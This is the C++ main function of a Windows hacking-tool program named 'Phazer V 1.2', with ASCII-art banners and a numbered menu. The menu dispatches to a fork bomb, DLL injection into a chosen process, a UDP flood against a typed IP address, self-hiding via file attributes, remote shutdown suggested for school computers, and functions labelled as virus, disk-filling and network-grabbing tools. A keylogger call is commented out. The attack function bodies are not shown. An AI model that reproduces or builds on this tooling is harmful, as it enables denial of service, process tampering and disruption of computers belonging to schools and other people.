//   _____            _           _
//   \_   \_ __   ___| |_   _  __| | ___  ___
//    / /\/ '_ \ / __| | | | |/ _` |/ _ \/ __|
// /\/ /_ | | | | (__| | |_| | (_| |  __/\__ \
// \____/ |_| |_|\___|_|\__,_|\__,_|\___||___/
#include "stdafx.h" 
#define VERSION L"Phazer V 1.2.exe"
using namespace std;

int main(int argc, char *argv[]) {
	BOOL FileAttribute;            // File Attribute for hiding/showing files
	char TargetIP[17];             // Target IP, 17 because it cant be any longer
	int option;                    // Takes in number for menu options 
	bool Running = true;           // Makes the program run all the time
	int PID;                       // PID for DLL Injection
	char PathtoDLL[100];           // Path to DLL 
	const string ask = "PHAZER> "; // Prompts every time for an option
	cout << endl;

	setColorDarkPurple(); //Console Color Dark Purple
	cout <<

		":::::::::::::   :::     :::       ::::::        :::::::::: :::::::::::: ::::::::::::::       \n"
		":+:        :+:  :+:     :+:      :+:  :+:             :+:  :+:          :+:        :+:       \n"
		"+:+         +:+ +:+     +:+     +:+    +:+           +:+   +:+          +:+         +:+      \n"
		":{}::{}::{}::{} {}::{}::{}:    :{}::{}::{}:        :{}:    :{}::{}::{}: :{}::{}::{}:{}::     \n"
		"+#+             +#+     +#+   +#+        +#+      +#+      +#+          +#+        +#+       \n"
		"#+#             #+#     #+#  #+#           #+#   #+#       #+#          #+#         #+#      \n"
		"###             ###     ### ###             ### ########## ############ ###          ###     \n";

	setColorDarkBlue(); //Console Color Dark Blue

	cout << "--------------------------------------- CREATED BY: -----------------------------------\n";
	setColorLightRed(); //Console Color Light Red
	cout <<
		"                                                   __                                      \n"
		"          ______   ____   _____  _____     _______/ |_    ____   _______                   \n"
		"         \\____ \\ _/ ___\\ /     \\ \\__  \\   / ___ /\\   __\\_/ __ \\  \\_  __ \\       \n"
		"         |  |_> >\\  \\___|  Y Y  \\ / __ \\_ \\___ \\ |  |   \\   ___/  |  | \\/           \n"
		" ______  |   __/  \\___  >|__|_|  /(____  //____ >|__|    \\___  >  |__|  ______          \n"
		"/_____ / |__|         \\/       \\/      \\/      \\/            \\/        /_____/          \n";

	setColorDarkBlue(); //Console Color Dark Blue
	cout << "\n--------------------------------------------------------------------------------------\nENTER ";
	setColorLightRed(); //Console Color Light Red
	cout << "'17' ";
	setColorDarkBlue(); //Console Color Dark Blue
	cout << "FOR OPTIONS\n";
	cout << "Hello, ";
	setColorLightBlue(); //Console Color Light Blue
	system("echo %username%");
	setColorDarkBlue(); //Console Color Dark Blue

	while (Running) {
		setColorLightRed(); //Console Color Red
		cout << ask;
		setColorLightBlue(); //Console Color Light Blue
		cin >> option;
		
		switch (option) {
		case 1: 
			FileAttribute = SetFileAttributes(VERSION, FILE_ATTRIBUTE_HIDDEN);
			break;
		case 2: 
			FileAttribute = SetFileAttributes(VERSION, FILE_ATTRIBUTE_NORMAL);
			break;
		case 3:
			system("echo %username%");
			break;
		case 4:
			cout << "(Best used on school computers <Because they're on servers>)" << endl;
			system("shutdown -i");
			break;
		case 5:
			system("cmd.exe");
			break;
		case 6:
			system("tasklist");
			break;
		case 7:
			system("ipconfig | findstr /r \"IPv4\"");
			break;
		case 8:
			if (option == 0)
				break;
			VirusOptions();
			break;
		case 9:
			forkbomb();
			break;
		case 10:
			system("tasklist");

			cout << "Enter PID to inject to: ";
			cin >> PID;
			cout << "\nEnter path to dll: ";
			cin >> PathtoDLL;

			Inject(PID, PathtoDLL);
			break;
		case 11:
			//Keylogger();
			break;
		case 12:
			break;
		case 13:
			SillyMouse();
			break;
		case 14: 
			cout << "<Target IP Address>: ";
			cin >> TargetIP;

			udpFlood(TargetIP);
			break;
		case 15:
			SpaceEaterDLL();
			break;
		case 16: 
			NetGrabber();
			break;
		case 17:
			menu();
			break;
		case CTRL_C_EVENT:
			break;
		}
		
		if (option >= 18)
			cout << "That is not an option." << endl;
	}

	return 0;
}

